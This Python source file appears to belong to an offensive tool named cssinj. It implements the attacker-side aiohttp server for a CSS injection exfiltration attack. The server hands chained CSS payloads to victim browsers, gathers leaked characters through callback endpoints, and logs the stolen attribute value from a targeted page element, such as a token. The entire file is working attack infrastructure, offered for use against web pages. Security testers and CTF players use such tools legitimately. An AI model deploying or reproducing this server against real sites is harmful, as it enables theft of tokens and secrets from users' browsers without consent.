from aiohttp import web
import asyncio
from cssinj import injection
from cssinj.client import Client, Clients
from cssinj.console import Console
from cssinj.utils.dom import Attribut, Element


class CSSInjector:
    def __init__(self):
        self.clients = Clients()

    def start(self, args):
        self.hostname = args.hostname
        self.port = args.port
        self.element = args.element
        self.attribut = args.attribut
        self.show_details = args.details

        self.app = web.Application()
        self.app.middlewares.append(self.dynamic_router_middleware)
        self.console = Console()

        web.run_app(
            self.app,
            port=self.port,
            print=self.console.log(
                "server", f"Attacker's server started on {args.hostname}:{args.port}"
            ),
        )

    async def handle_start(self, request):
        client = Client(
            host=request.remote,
            accept=request.get("accept"),
            user_agent=request.get("user_agent"),
            event=asyncio.Event(),
        )
        self.clients.append(client)
        self.console.log("connection", f"Connection from {client.host}")
        self.console.log("connection_details", f"ID : {client.id}")
        client.event.set()

        if self.show_details:
            for key, value in request.headers.items():
                self.console.log("connection_details", f"{key} : {value}")

        return web.Response(
            text=injection.generate_next_import(self.hostname, self.port, client),
            content_type="text/css",
        )

    async def handle_end(self, request):
        client_id = request.query.get("client_id")

        client = self.clients[client_id]
        element = Element(name=self.element)
        element.attributs.append(Attribut(name=self.attribut, value=client.data))
        client.elements.append(element)

        client.event.set()

        self.console.log(
            "end_exfiltration",
            f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
        )

        client.data = ""

        return web.Response(
            text=f"ok",
            content_type="text/css",
        )

    async def handle_next(self, request):
        client_id = request.query.get("client_id")
        client = self.clients[client_id]

        client.counter += 1

        await client.event.wait()
        client.event.clear()

        return web.Response(
            text=injection.generate_payload(
                hostname=self.hostname,
                port=self.port,
                element=self.element,
                attribut=self.attribut,
                client=client,
            ),
            content_type="text/css",
        )

    async def handle_valid(self, request):
        client_id = request.query.get("client_id")
        client = self.clients[client_id]

        client.event.set()

        client.data = request.query.get("token")

        if self.show_details:
            self.console.log(
                "exfiltration",
                f"[{client.id}] - Exfiltrating element {len(client.elements)} : {client.data}",
            )
        return web.Response(text="ok.", content_type="image/x-icon")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/next"):
                return await self.handle_next(request)
            elif path.startswith("/valid"):
                return await self.handle_valid(request)
            elif path.startswith("/end"):
                return await self.handle_end(request)

            return web.Response(text="404: Not Found", status=404)

        return middleware_handler
